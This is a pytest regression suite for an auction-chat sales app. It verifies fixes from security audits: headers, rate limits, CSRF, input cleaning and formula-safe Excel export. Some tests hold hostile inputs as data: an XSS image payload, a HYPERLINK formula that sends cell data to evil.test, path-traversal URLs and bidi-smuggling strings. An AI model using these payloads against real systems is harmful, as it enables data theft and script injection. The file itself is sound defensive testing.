"""Regression tests for the 2026-10-20 security audit (claude-reports/Security-Audit/).

Each test names the finding it proves fixed.
"""

import io
import json

import pytest
from openpyxl import load_workbook
from sqlalchemy import select

from app.config import Config, ConfigError
from app.db import db
from app.models import ChatMessage, ReviewItem, Sale, SaleStatus
from app.services import pipeline, reconcile, reports, rules, stock
from app.services.inventory import Actor
from tests.test_ingest import batch, row
from tests.test_pipeline import run, sales

PW = "correct-horse-battery"


def owner(client):
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    client.post(
        "/api/auth/signup",
        json={"organization": "Shop", "name": "O", "email": "o@shop.test", "password": PW},
        headers=h,
    )
    return h


# ---------- configuration and HTTP hardening ----------


@pytest.mark.parametrize("value", [None, "", "prod", "Production "])
def test_config_fails_closed_without_a_known_app_env(monkeypatch, value):
    """AUTH-4 / WEB-3: anything but development/test is production or refused."""
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://localhost:5432/x")
    monkeypatch.delenv("SECRET_KEY", raising=False)
    if value is None:
        monkeypatch.delenv("APP_ENV", raising=False)
    else:
        monkeypatch.setenv("APP_ENV", value)
    with pytest.raises(ConfigError):
        Config()  # either "unknown APP_ENV" or "SECRET_KEY must be set in production"


def test_security_headers_and_no_store_on_api(client):
    """AUTH-8 / WEB-2."""
    r = client.get("/api/health")
    assert r.headers["Cache-Control"] == "no-store"
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Referrer-Policy"] == "same-origin"


def test_source_maps_and_paths_outside_dist_are_not_served(client):
    """WEB-5 / WEB-10: no .map files, and no file-existence oracle outside web/dist."""
    assert client.get("/assets/index-abc.js.map").status_code == 404
    a = client.get("/..%2f..%2fapi%2fwsgi.py")  # exists on disk
    b = client.get("/..%2f..%2fapi%2fnope.py")  # does not
    assert a.status_code == b.status_code


def test_oversized_bodies_are_refused_before_parsing(client):
    """AUTH-2 / DATA-5."""
    r = client.post(
        "/api/pair", data=json.dumps({"code": "x" * 5000}), content_type="application/json"
    )
    assert r.status_code == 413
    big = b'{"x":"' + b"a" * (9 * 1024 * 1024) + b'"}'
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    r = client.post("/api/auth/login", data=big, content_type="application/json", headers=h)
    assert r.status_code == 413


# ---------- pairing / login rate limits ----------


def test_pairing_attempts_are_rate_limited_and_odd_codes_are_400(client):
    """DATA-10."""
    assert client.post("/api/pair", json={"code": 12345678}).status_code == 400
    assert client.post("/api/pair", json={"code": ["A"]}).status_code == 400
    codes = [client.post("/api/pair", json={"code": "ABCD-EFGH"}).status_code for _ in range(25)]
    assert codes.count(429) >= 1 and 500 not in codes


def test_login_is_rate_limited_per_address(client):
    """AUTH-2."""
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    codes = [
        client.post(
            "/api/auth/login", json={"email": f"n{i}@x.test", "password": "x" * 12}, headers=h
        ).status_code
        for i in range(32)
    ]
    assert codes[-1] == 429 and 500 not in codes


# ---------- ingest ----------


def test_bad_dates_and_huge_seq_are_400_not_500(client, auth):
    """DATA-7: a 500 made the extension retry forever."""
    bad_date = batch([row(1)])
    bad_date["rows"][0]["capturedAt"] = "not-a-date"
    r = client.post("/api/ingest", json=bad_date, headers=auth)
    assert r.status_code == 400
    naive = batch([row(1)])
    naive["rows"][0]["capturedAt"] = "2026-10-19T20:00:00"
    assert client.post("/api/ingest", json=naive, headers=auth).status_code == 400
    far = batch([row(1)])
    far["rows"][0]["capturedAt"] = "0001-01-01T00:00:00Z"
    assert client.post("/api/ingest", json=far, headers=auth).status_code == 400
    big = batch([row(2**31)])
    assert client.post("/api/ingest", json=big, headers=auth).status_code == 400


def test_nul_bytes_are_stripped_and_errors_do_not_echo_chat(client, app, auth):
    """DATA-7 / EXT-2."""
    r = client.post("/api/ingest", json=batch([row(1, text="hi\x00there")]), headers=auth)
    assert r.status_code == 200
    with app.app_context():
        assert db.session.scalar(select(ChatMessage.body)) == "hithere"
    long = batch([row(2, text="<img src=x onerror=alert(1)>" + "a" * 4000)])
    r = client.post("/api/ingest", json=long, headers=auth)
    assert r.status_code == 400
    assert "<img" not in json.dumps(r.get_json())


# ---------- parser ----------


def test_a_viewer_listing_does_not_decide_the_next_win(app, world):
    """DATA-2."""
    world["say"](
        app,
        [
            ("", "Auction #1: Red bundle"),
            ("viewer1", "Now selling - Mystery item"),
            ("", "lani808 won the auction!"),
        ],
    )
    run(app, world["show"])
    assert sales(app, world["show"]) == [("lani808", "paid", "RED", 1)]


def test_a_very_long_chat_line_does_not_stop_parsing(app, world):
    """DATA-3."""
    world["say"](
        app,
        [
            ("", "Up next: " + "x" * 400),
            ("", "lani808 won Red bundle"),
        ],
    )
    stats = run(app, world["show"])
    assert stats.parsed == 2
    assert sales(app, world["show"]) == [("lani808", "paid", "RED", 1)]
    c = rules.classify("", "kat.c won " + "y" * 500, "")
    assert len(c.item) <= rules.ITEM_MAX


def test_sales_cannot_be_moved_backwards_without_the_ledger(app, world):
    """DATA-18."""
    world["say"](app, [("", "lani808 won Red bundle"), ("host_shop", "cancelled for lani808")])
    run(app, world["show"])
    with app.app_context():
        sale = db.session.scalar(select(Sale))
        assert sale.status is SaleStatus.cancelled
        with pytest.raises(pipeline.ReviewError):
            pipeline.set_sale_status(sale, SaleStatus.reserved, reason="x", actor=Actor())


# ---------- reconcile (money) ----------


@pytest.mark.parametrize(
    "text,cents",
    [
        ("$25.00", 2500),
        ("25", 2500),
        ("$1,234.56", 123456),
        ("$1,234", 123400),
        ("12,500", 1250000),
        ("USD 1,050", 105000),
        ("25 USD", 2500),
        ("USD25.00", 2500),
        ("CAD$ 30.00", 3000),
        ("12,50", 1250),
        ("1000,50", 100050),
        ("12,3", 1230),
        ("1.234,56", 123456),
        ("$0.07", 7),
        ("$12.345", 1235),
        ("0", 0),
        ("-5.00", None),
        ("-$5.00", None),
        ("$-5.00", None),
        ("(5.00)", None),
        ("\u22125.00", None),
        ("$.99", None),
        ("1e3", None),
        ("2 for $10", None),
        ("1 234.56", None),
        ("21474836.48", None),
        ("", None),
        ("n/a", None),
    ],
)
def test_money_parsing_handles_thousands_separators(text, cents):
    """DATA-8."""
    assert reconcile._cents(text) == cents


def test_absurd_quantities_do_not_crash_the_import():
    """DATA-8."""
    rows = reconcile.parse_csv("Buyer,Product,Quantity,Status\nlani808,Red bundle,inf,paid\n")
    assert rows[0].quantity == 1


def test_a_line_total_only_fills_the_unit_price_when_it_divides():
    """Money review #1: a Total column is per line, Sale.price_cents is per unit."""
    rows = reconcile.parse_csv(
        "Buyer,Product,Quantity,Total,Status\nbob,Card,3,$30.00,paid\nkat,Card,3,$10.00,paid\n"
    )
    assert [r.price_cents for r in rows] == [1000, None]


def test_unmatched_payment_dedupe_is_exact(app, world):
    """DATA-9: "bob" must not be hidden by an open review about "bobby"."""
    # Neither buyer has a sale: both payments are unmatched. The old LIKE check
    # ("%bob%card%") matched bobby's open review and silently dropped bob's.
    csv = "Buyer,Product,Status\nbobby,card 2,paid\nbob,card,paid\n"
    with app.app_context():
        from app.models import Show

        show = db.session.get(Show, world["show"])
        p = reconcile.plan(show, reconcile.parse_csv(csv))
        reconcile.apply(show, p, actor=Actor(), import_id="imp")
        db.session.commit()
        buyers = sorted(
            (r.proposal or {}).get("buyer")
            for r in db.session.scalars(
                select(ReviewItem).where(ReviewItem.reason == "unmatched_payment")
            )
        )
    assert "bob" in buyers


def test_two_identical_unmatched_payments_stay_two_and_reapplying_adds_nothing(app, world):
    """Money review #2 / #8."""
    csv = "Buyer,Product,Status\nbob,Mystery Pack,paid\nBob,mystery pack,paid\n"
    with app.app_context():
        from app.models import Show

        show = db.session.get(Show, world["show"])
        for imp in ("one", "two"):  # the same file applied twice
            reconcile.apply(
                show, reconcile.plan(show, reconcile.parse_csv(csv)), actor=Actor(), import_id=imp
            )
            db.session.commit()
        n = db.session.scalar(
            select(db.func.count())
            .select_from(ReviewItem)
            .where(ReviewItem.reason == "unmatched_payment")
        )
    assert n == 2


# ---------- reports ----------


def test_excel_reports_never_contain_formulas_from_chat(app, world):
    """DATA-6 / WEB-6."""
    world["say"](app, [("", 'lani808 won =HYPERLINK("https://evil.test/?"&A2,"x") for $5')])
    run(app, world["show"])
    with app.app_context():
        from app.models import Organization

        data = reports.build(db.session.get(Organization, world["org"]))
        wb = load_workbook(io.BytesIO(data))
        formulas = [
            c.coordinate
            for ws in wb.worksheets
            for r in ws.iter_rows()
            for c in r
            if c.data_type == "f"
        ]
        assert formulas == []
        texts = [c.value for ws in wb.worksheets for r in ws.iter_rows() for c in r]
        assert any(isinstance(v, str) and v.startswith("=HYPERLINK") for v in texts)


# ---------- stock / download ----------


def test_receipt_ids_cannot_contain_like_wildcards():
    """DATA-17."""
    with pytest.raises(stock.InventoryError):
        stock._client_id("abc_def_1")


def test_download_refuses_to_bake_a_host_header_url_in_production(client, app, monkeypatch):
    """DATA-14 / EXT-11."""
    owner(client)
    monkeypatch.delenv("APP_URL", raising=False)
    monkeypatch.delenv("RENDER_EXTERNAL_URL", raising=False)
    app.config["APP_ENV"] = "production"
    try:
        info = client.get("/api/extension").get_json()
        assert info["serverUrl"] is None and info["available"] is False
    finally:
        app.config["APP_ENV"] = "test"


def test_the_extension_disconnect_revokes_its_own_key(client, app, auth):
    """EXT-5: Disconnect in the extension kills the key on the server too."""
    assert client.get("/api/ingest/ping", headers=auth).status_code == 200
    assert client.post("/api/ingest/disconnect", headers=auth).status_code == 204
    assert client.get("/api/ingest/ping", headers=auth).status_code == 401


# ---------- 2026-10-31 hardening (claude-reports/Security-Efficiency-Review/) ----------


def _seed_email_failures(app, email: str, n: int = 100) -> None:
    from app.models import RateLimit
    from app.services.ratelimit import _window

    with app.app_context():
        db.session.add(RateLimit(key=f"login-fail:{email}", window_start=_window(3600), count=n))
        db.session.commit()


def test_distributed_guessing_cannot_lock_the_owner_out_of_a_known_browser(client, app):
    """#3: 100 failures from many addresses stop strangers, not the owner's own laptop."""
    from app.models import RateLimit
    from app.services import accounts

    h = owner(client)  # signing up marks this browser as known for o@shop.test
    client.post("/api/auth/logout", headers=h)
    _seed_email_failures(app, "o@shop.test")

    stranger = app.test_client()
    hs = {"X-CSRF-Token": stranger.get("/api/auth/csrf").get_json()["token"]}
    r = stranger.post(
        "/api/auth/login",
        json={"email": "o@shop.test", "password": PW},
        headers=hs,
        environ_overrides={"REMOTE_ADDR": "198.51.100.9"},
    )
    assert r.status_code == 429 and int(r.headers["Retry-After"]) > 0

    r = client.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=h)
    assert r.status_code == 200

    # A tampered cookie is just a stranger.
    forged = app.test_client()
    hf = {"X-CSRF-Token": forged.get("/api/auth/csrf").get_json()["token"]}
    forged.set_cookie("wn_known", "W10.forged.sig", path="/api/auth")
    r = forged.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=hf)
    assert r.status_code == 429

    # A password reset forgets every browser that signed in before it (a copied cookie
    # from a lost laptop stops helping), while the browser that did the reset is known.
    before = client.get_cookie("wn_known", path="/api/auth").value
    with app.app_context():
        token = accounts.request_password_reset("o@shop.test", return_token=True)
    new_pw = PW + "-new"
    r = client.post(
        "/api/auth/password/reset", json={"token": token, "password": new_pw}, headers=h
    )
    assert r.status_code == 200
    client.post("/api/auth/logout", headers=h)
    with app.app_context():
        db.session.execute(db.delete(RateLimit))
        db.session.commit()
    _seed_email_failures(app, "o@shop.test")
    stale = app.test_client()
    hst = {"X-CSRF-Token": stale.get("/api/auth/csrf").get_json()["token"]}
    stale.set_cookie("wn_known", before, path="/api/auth")
    r = stale.post(
        "/api/auth/login", json={"email": "o@shop.test", "password": new_pw}, headers=hst
    )
    assert r.status_code == 429
    r = client.post("/api/auth/login", json={"email": "o@shop.test", "password": new_pw}, headers=h)
    assert r.status_code == 200


def test_a_wrong_password_does_not_restore_the_admin(client, app, monkeypatch):
    """#21: the restore (and its session rotation) needs the right password."""
    from app.models import Role, User

    monkeypatch.setenv("ADMIN_EMAIL", "o@shop.test")
    owner(client)
    with app.app_context():
        u = db.session.scalar(select(User).where(User.email == "o@shop.test"))
        u.role, u.disabled = Role.viewer, True
        db.session.commit()
        token = u.session_token
    fresh = app.test_client()
    h = {"X-CSRF-Token": fresh.get("/api/auth/csrf").get_json()["token"]}
    r = fresh.post(
        "/api/auth/login", json={"email": "o@shop.test", "password": "x" * 12}, headers=h
    )
    assert r.status_code == 401
    with app.app_context():
        u = db.session.scalar(select(User).where(User.email == "o@shop.test"))
        assert (u.role, u.disabled, u.session_token) == (Role.viewer, True, token)
    r = fresh.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=h)
    assert r.status_code == 200 and r.get_json()["user"]["role"] == "owner"


def test_non_ascii_csrf_header_is_403_not_500(client):
    """#22: compare_digest raised TypeError on non-ASCII input."""
    client.get("/api/auth/csrf")
    r = client.post(
        "/api/auth/login",
        json={"email": "a@b.co", "password": PW},
        headers={"X-CSRF-Token": "é" * 43},
    )
    assert r.status_code == 403


def test_invite_lookup_is_rate_limited(client):
    """Every unauthenticated route has a limit; the invite lookup had none."""
    codes = [client.get("/api/auth/invites/not-a-token").status_code for _ in range(32)]
    assert codes[0] == 404 and codes[-1] == 429


def test_a_huge_rows_array_is_refused_without_validating_each_row():
    """#2: 100k one-byte rows made jsonschema build 100k error objects (~350 MB)."""
    import time
    import tracemalloc

    from app.services.ingest import BatchInvalid, validate

    payload = batch([])
    payload["rows"] = [1] * 100_000
    tracemalloc.start()
    t = time.perf_counter()
    with pytest.raises(BatchInvalid) as e:
        validate(payload)
    elapsed = time.perf_counter() - t
    peak = tracemalloc.get_traced_memory()[1]
    tracemalloc.stop()
    assert "maxItems" in e.value.errors[0]
    assert elapsed < 0.5 and peak < 5 * 1024 * 1024
    with pytest.raises(BatchInvalid):
        validate(["not", "an", "object"])


def test_sheet_builder_is_linear_and_still_writes_formulas_as_text():
    """#1: the formula guard rescanned the sheet after every row (O(rows²)): 5,000 rows
    of 8 columns took ~3.9 s before, ~0.06 s after (measured locally)."""
    import time

    from openpyxl import Workbook

    rows = [
        [i, f"buyer{i}", '=HYPERLINK("http://x")' if i % 100 == 0 else "ok", i, "a", "b", "c", "d"]
        for i in range(5000)
    ]
    wb = Workbook()
    t = time.perf_counter()
    reports._sheet(wb, "T", list("ABCDEFGH"), rows, first=True)
    assert time.perf_counter() - t < 1
    ws = wb.active
    assert ws.cell(row=2, column=3).data_type == "s"  # row for i == 0
    assert ws.cell(row=2, column=3).value.startswith("=HYPERLINK")
    assert not [c for r in ws.iter_rows() for c in r if c.data_type == "f"]


def test_jobs_inline_is_refused_in_production(monkeypatch):
    """#6: inline jobs would run every parse inside a web request."""
    monkeypatch.setenv("APP_ENV", "production")
    monkeypatch.setenv("SECRET_KEY", "s" * 32)
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://localhost:5432/x")
    monkeypatch.setenv("JOBS_INLINE", "1")
    with pytest.raises(ConfigError, match="JOBS_INLINE"):
        Config()
    monkeypatch.delenv("JOBS_INLINE")
    Config()


def test_unhandled_errors_are_json_and_deep_json_is_400(client, monkeypatch):
    """#22: Flask's HTML 500 page for anything a route did not handle."""
    from app.services import accounts

    def boom():
        raise RuntimeError("kaboom")

    monkeypatch.setattr(accounts, "signup_state", boom)
    r = client.get("/api/auth/me")
    assert r.status_code == 500 and r.is_json and "kaboom" not in r.get_data(as_text=True)
    monkeypatch.undo()

    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    deep = "[" * 100_000 + "]" * 100_000
    r = client.post("/api/auth/login", data=deep, content_type="application/json", headers=h)
    assert r.status_code == 400 and r.is_json
    assert client.get("/api/nope").is_json  # an /api 404 answers JSON too
    r = client.delete("/api/auth/csrf")  # 405 keeps its Allow header
    assert r.status_code == 405 and r.is_json and "GET" in r.headers["Allow"]


def test_retention_sweep_drops_only_old_bookkeeping(app):
    """#8: done jobs, finished rate-limit windows and dead tokens no longer grow forever."""
    from datetime import UTC, datetime, timedelta

    from app.models import DevicePairing, Job, JobStatus, Organization, RateLimit
    from app.services import retention

    now = datetime.now(UTC)
    with app.app_context():
        org = Organization(name="Shop", slug="shop")
        db.session.add(org)
        db.session.flush()

        def job(status, age_days):
            return Job(
                kind="parse_show",
                payload={},
                status=status,
                finished_at=now - timedelta(days=age_days),
            )

        db.session.add_all(
            [
                job(JobStatus.done, 8),
                job(JobStatus.done, 1),
                job(JobStatus.failed, 100),
                job(JobStatus.failed, 30),
                Job(kind="parse_show", payload={}, status=JobStatus.queued),
                DevicePairing(
                    organization_id=org.id,
                    name="old",
                    code_hash="a" * 64,
                    expires_at=now - timedelta(days=40),
                ),
                DevicePairing(
                    organization_id=org.id,
                    name="new",
                    code_hash="b" * 64,
                    expires_at=now + timedelta(minutes=5),
                ),
                RateLimit(key="old", window_start=now - timedelta(days=2), count=1),
                RateLimit(key="new", window_start=now, count=1),
            ]
        )
        db.session.commit()
        out = retention.sweep()
        assert out["jobs_done"] == 1 and out["jobs_failed"] == 1
        assert out["device_pairings"] == 1 and out["rate_limits"] == 1
        left = db.session.scalars(select(Job.status)).all()
        assert sorted(s.value for s in left) == ["done", "failed", "queued"]
        assert db.session.scalars(select(DevicePairing.name)).all() == ["new"]
        assert db.session.scalars(select(RateLimit.key)).all() == ["new"]


def test_a_lost_movement_race_keeps_the_callers_earlier_work(app, world, monkeypatch):
    """#10: the duplicate-source path rolled back the caller's whole transaction."""
    from app.models import InventoryMovement, MovementKind, Product, Sku
    from app.services import catalog, inventory

    with app.app_context():
        first = inventory.move(
            world["red"], MovementKind.reserve, 1, source_type="sale", source_id="42"
        )
        db.session.commit()
        first_id = first.id

    with app.app_context():
        catalog.create_product(world["org"], "Blue bundle", skus=[{"code": "BLUE"}])
        real = inventory._existing
        calls = {"n": 0}

        def blind(*a):  # miss the committed row twice, as a concurrent winner would
            calls["n"] += 1
            return None if calls["n"] <= 2 else real(*a)

        monkeypatch.setattr(inventory, "_existing", blind)
        m = inventory.move(
            world["red"], MovementKind.reserve, 1, source_type="sale", source_id="42"
        )
        assert m.id == first_id and calls["n"] == 3
        db.session.commit()

    with app.app_context():
        assert db.session.scalar(select(Product).where(Product.name == "Blue bundle"))
        red = db.session.get(Sku, world["red"])
        assert red.reserved == 1
        n = db.session.scalar(
            select(db.func.count())
            .select_from(InventoryMovement)
            .where(InventoryMovement.source_id == "42")
        )
        assert n == 1


# ---------- injected / disguised text and abuse limits (2026-10-27) ----------


def test_control_characters_and_invisible_marks_are_stripped_from_chat(client, app, auth):
    """A viewer's line is stored as plain text: no bidi overrides, zero-width or control
    characters that would make Review show something other than what the parser read."""
    sneaky = "‮won the auction‬ for​ $1\x07\r\nnext line"
    r = client.post("/api/ingest", json=batch([row(1, text=sneaky)]), headers=auth)
    assert r.status_code == 200
    with app.app_context():
        body = db.session.scalar(select(ChatMessage.body))
    assert body == "won the auction for $1 next line"
    family = "👨‍👩‍👧"  # emoji sequences keep their joiner
    client.post("/api/ingest", json=batch([row(2, text=family)]), headers=auth)
    with app.app_context():
        assert db.session.scalar(select(ChatMessage.body).where(ChatMessage.seq == 2)) == family


@pytest.mark.parametrize(
    "url,kept",
    [
        ("/live/abc", "/live/abc"),
        ("https://www.whatnot.com/live/abc", "https://www.whatnot.com/live/abc"),
        ("javascript:alert(1)", None),
        ("//evil.test/live", None),
        ("https://evil.test/live", None),
        ("http://www.whatnot.com/live/abc", None),
        ("https://whatnot.com.evil.test/x", None),
    ],
)
def test_only_a_whatnot_address_is_kept_for_a_show(client, app, auth, url, kept):
    from app.models import Show

    b = batch([row(1)])
    b["show"]["url"] = url
    assert client.post("/api/ingest", json=b, headers=auth).status_code == 200
    with app.app_context():
        assert db.session.scalar(select(Show.source_url)) == kept


def test_uploaded_csv_cells_lose_controls_and_invisible_marks():
    rows = reconcile.parse_csv("Buyer,Product,Status\n‮eve\x1b[31m,Red​ bundle,Paid\n")
    assert (rows[0].buyer, rows[0].item) == ("eve[31m", "Red bundle")


def test_wrong_device_keys_are_rate_limited_per_address(client):
    codes = [
        client.get("/api/ingest/ping", headers={"Authorization": f"Bearer wn_guess{i}"}).status_code
        for i in range(35)
    ]
    assert codes[:30] == [401] * 30 and codes[-1] == 429


def test_one_device_cannot_flood_the_api(client, auth, monkeypatch):
    from app.routes import ingest as ingest_routes

    monkeypatch.setattr(ingest_routes, "DEVICE_CALLS_PER_MIN", 5)
    codes = [client.get("/api/ingest/ping", headers=auth).status_code for _ in range(7)]
    assert codes[:5] == [200] * 5 and codes[-1] == 429


def test_a_signed_in_person_has_a_write_limit(client, monkeypatch):
    from app import auth as auth_mod

    h = owner(client)
    monkeypatch.setattr(auth_mod, "WRITES_PER_MIN", 3)
    codes = [
        client.post("/api/inventory/import", json={"csv": "x"}, headers=h).status_code
        for _ in range(5)
    ]
    assert 429 in codes and 500 not in codes


def test_upload_routes_refuse_non_text_bodies(client):
    h = owner(client)
    for bad in ({"csv": ["a"]}, {"csv": {"x": 1}}, {"csv": 5}):
        assert client.post("/api/inventory/import", json=bad, headers=h).status_code == 400


@pytest.mark.parametrize(
    "line",
    [
        "bob won" + " " * 3990 + "x",
        "bob won" + " ​" * 1990 + " x",
        "sold to bob - " + "item " * 790 + "for",
        "bob won " + "a " * 1990 + "$",
    ],
)
def test_a_long_crafted_line_classifies_in_milliseconds(line):
    """One viewer line made of spaces (or zero-width spaces the cleaner removes) used to make
    the item / price patterns backtrack for minutes and stall every parse."""
    import time

    from app.services import text

    stored = text.clean(line)
    t = time.perf_counter()
    rules.classify("", stored, stored)
    rules.classify("viewer", stored, stored, host="host_shop")
    assert time.perf_counter() - t < 0.05


def test_a_friendly_host_line_does_not_back_an_ai_cancel():
    from app.services.supervisor import _says_it_went_wrong

    assert not _says_it_went_wrong("lani808 no refunds on mystery packs, enjoy!")
    assert not _says_it_went_wrong("lani808 we do not cancel")
    assert _says_it_went_wrong("lani808 card declined, relisting")


def test_the_ai_has_an_hourly_budget_per_shop(app, world, monkeypatch):
    from app.models import AiCall
    from app.services import supervisor

    monkeypatch.setenv("AI_PROVIDER", "fake")
    monkeypatch.setattr(supervisor, "AI_CALLS_PER_HOUR", 2)
    with app.app_context():
        for _ in range(4):
            supervisor.ask("classify_line", "x", "hello", {"type": "object"}, org_id=world["org"])
        db.session.commit()
        errors = db.session.scalars(select(AiCall.error).order_by(AiCall.id)).all()
    assert errors[2:] == ["hourly AI budget", "hourly AI budget"]
    assert "hourly AI budget" not in errors[:2]


def test_pick_sale_only_takes_one_of_the_items_choices(app, world):
    from app.models import User

    world["say"](
        app,
        [
            ("", "lani808 won Red bundle"),
            ("", "lani808 won Red bundle for $25"),
            ("", "kat.c won Red bundle"),
        ],
    )
    world["say"](app, [("host_shop", "cancelled for lani808")])
    run(app, world["show"])
    with app.app_context():
        item = db.session.scalar(select(ReviewItem).where(ReviewItem.reason == "ambiguous_sale"))
        kat = db.session.scalar(select(Sale).where(Sale.buyer_username == "kat.c"))
        u = User(
            organization_id=world["org"],
            email="o@x.test",
            name="O",
            password_hash="x",
            role="owner",
            session_token="t",
        )
        db.session.add(u)
        db.session.flush()
        with pytest.raises(pipeline.ReviewError, match="not one of this item's choices"):
            pipeline.resolve(item, "pick_sale", {"saleId": kat.id}, user=u)
        for bad in ({"saleId": "abc"}, {"saleId": [1]}, {"saleId": True}):
            with pytest.raises(pipeline.ReviewError):
                pipeline.resolve(item, "pick_sale", bad, user=u)
        db.session.rollback()
    assert [s[1] for s in sales(app, world["show"]) if s[0] == "kat.c"] == ["paid"]


def test_deeply_nested_json_is_400_not_500(client, auth):
    deep = "[" * 100_000 + "]" * 100_000
    r = client.post("/api/ingest", data=deep, headers={**auth, "Content-Type": "application/json"})
    assert r.status_code == 400


# ---------- what the browser is told (2026-11-07: internal names reached the page) ----------


def test_the_activity_log_sends_sentences_not_codes_or_json(client):
    """Settings → Activity printed `invite.created` and `{"email":…,"role":"owner"}`."""
    h = owner(client)
    r = client.post(
        "/api/team/invites", json={"email": "Pat@Shop.test", "role": "owner"}, headers=h
    )
    assert r.status_code == 201
    res = client.get("/api/audit")
    entries = res.get_json()["entries"]
    assert all(set(e) == {"id", "at", "who", "summary"} for e in entries)
    assert entries[0]["who"] == "o@shop.test"
    assert entries[0]["summary"] == "Invited pat@shop.test as Owner"
    assert entries[-1]["summary"] == "Created the shop"
    body = res.get_data(as_text=True)
    for raw in (
        "invite.created",
        "org.created",
        '\\"role\\"',
        '"details"',
        '"action"',
        "targetType",
    ):
        assert raw not in body


def test_odd_or_unknown_audit_rows_still_read_as_words():
    from app.services.activity import actor, describe

    assert describe("something.new", {"x": 1}) == "Made a change"
    assert describe("invite.created", {"unexpected": True}) == "Sent an invite"
    assert describe("order.status", {"status": "not-a-status"}) == "Moved an order"
    assert describe("support.restored", {"password": "reset from IT_SUPPORT_PASSWORD"}) == (
        "Restored the IT support account"
    )
    assert (
        describe(
            "user.updated", {"role": ["manager", "owner"], "disabled": [False, True]}, "pat@x.test"
        )
        == "Changed pat@x.test's role from Manager to Owner; turned off pat@x.test's access"
    )
    assert describe("inventory.imported", {"set": 2, "create": 1, "skip": 0}) == (
        "Imported the stock sheet: 1 added, 2 updated"
    )
    assert actor("system", "flask autopay-reserved") == "Automatic"
    assert actor("rule", "whatnot autopay") == "Automatic"
    assert actor("ai", "ai supervisor") == "AI"


def test_errors_do_not_name_permissions_settings_or_vendor_errors(app, client, monkeypatch):
    from app.services import supervisor

    h = owner(client)
    token = (
        client.post("/api/team/invites", json={"email": "v@shop.test", "role": "viewer"}, headers=h)
        .get_json()["acceptUrl"]
        .rsplit("/", 1)[1]
    )
    viewer = app.test_client()
    viewer.post(
        "/api/auth/invites/accept",
        json={"token": token, "name": "V", "password": PW},
        headers={"X-CSRF-Token": viewer.get("/api/auth/csrf").get_json()["token"]},
    )
    assert viewer.get("/api/audit").get_json() == {"error": "you do not have permission to do that"}

    monkeypatch.setenv("AI_PROVIDER", "fake")
    with app.app_context():
        from app.models import Organization

        org_id = db.session.scalar(select(Organization.id))
        supervisor._log_call(
            org_id, None, "jev", "classify", 0, 0, None, False, "JEV_API_KEY is not set"
        )
        db.session.commit()
    status = client.get("/api/review/ai-status").get_json()
    assert status["provider"] == "Test provider" and status["lastFailedAt"]
    assert "lastError" not in status and "JEV_API_KEY" not in json.dumps(status)


# ---------- 2026-11-07 security check, part B (claude-reports/Security-Audit/) ----------


def test_typed_text_loses_control_characters_and_old_rows_still_export():
    """B3: a bell in an order note made openpyxl refuse every report with that order."""
    from openpyxl import Workbook

    from app.models import Order, Product

    o = Order(notes="leave at\x07 door\nring twice", tracking="1Z\t99‮", packed_by="Pat\x00")
    assert (o.notes, o.tracking, o.packed_by) == ("leave at door\nring twice", "1Z 99", "Pat")
    assert Product(name="Red\x1b[31m bundle").name == "Red[31m bundle"
    ws = reports._sheet(Workbook(), "T", ["Notes"], [["saved before the fix\x07"]], first=True)
    assert ws["A2"].value == "saved before the fix"


def test_forgot_password_does_the_same_work_for_unknown_addresses(client, app, monkeypatch):
    """B4: only real accounts were rate-counted, given a reset row and mailed in the request
    (slower, and a Mailgun failure was a 500 for them alone)."""
    from app.models import Job, PasswordReset
    from app.routes import auth as auth_routes
    from app.services import jobs, mail

    h = owner(client)
    client.post("/api/auth/logout", headers=h)
    monkeypatch.setattr(auth_routes, "_dev_links_allowed", lambda: False)
    monkeypatch.delenv("JOBS_INLINE", raising=False)

    def boom(_msg, **_kw):
        raise mail.MailError("Mailgun returned 500")

    monkeypatch.setattr(mail, "send", boom)
    with app.app_context():
        before = db.session.scalar(select(db.func.count()).select_from(Job))
    answers = [
        client.post("/api/auth/password/forgot", json={"email": e}, headers=h)
        for e in ("o@shop.test", "nobody@shop.test")
    ]
    assert [(r.status_code, r.get_json()) for r in answers] == [(202, {"ok": True})] * 2
    with app.app_context():
        queued = db.session.scalars(select(Job).order_by(Job.id).offset(before)).all()
        assert [j.kind for j in queued] == ["reset_mail", "reset_mail"]
        for j in queued:  # the worker: the failing mail stays in the job, never in a response
            jobs.run_job(j.id)
        assert db.session.scalar(select(db.func.count()).select_from(PasswordReset)) == 0
        monkeypatch.setattr(mail, "send", lambda _msg, **_kw: True)
        for j in queued:
            jobs.run_job(j.id)
        assert db.session.scalar(select(db.func.count()).select_from(PasswordReset)) == 1


def test_a_planted_csrf_cookie_is_not_enough_and_the_token_survives_sign_in(client):
    """B5: the token lives in the signed session; a cookie a sibling subdomain plants is
    ignored, and signing in or out keeps the page's token."""
    client.set_cookie("csrf", "a" * 43)
    r = client.post(
        "/api/auth/login",
        json={"email": "o@shop.test", "password": PW},
        headers={"X-CSRF-Token": "a" * 43},
    )
    assert r.status_code == 403
    h = owner(client)
    assert client.post("/api/auth/logout", headers=h).status_code == 204
    r = client.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=h)
    assert r.status_code == 200
    r = client.patch("/api/team/organization", json={"hostUsername": "x"}, headers=h)
    assert r.status_code == 200


def _production_config(monkeypatch, **env):
    monkeypatch.setenv("APP_ENV", "production")
    monkeypatch.setenv("SECRET_KEY", "x" * 40)
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://localhost:5432/x")
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    return Config()


def test_production_cookies_and_logs_resist_tossing_and_leaks(monkeypatch):
    """B5: `__Host-` session cookie. B7: no SQL parameters in logged errors."""
    c = _production_config(monkeypatch)
    assert c.SESSION_COOKIE_NAME == "__Host-wn_session" and c.SESSION_COOKIE_SECURE
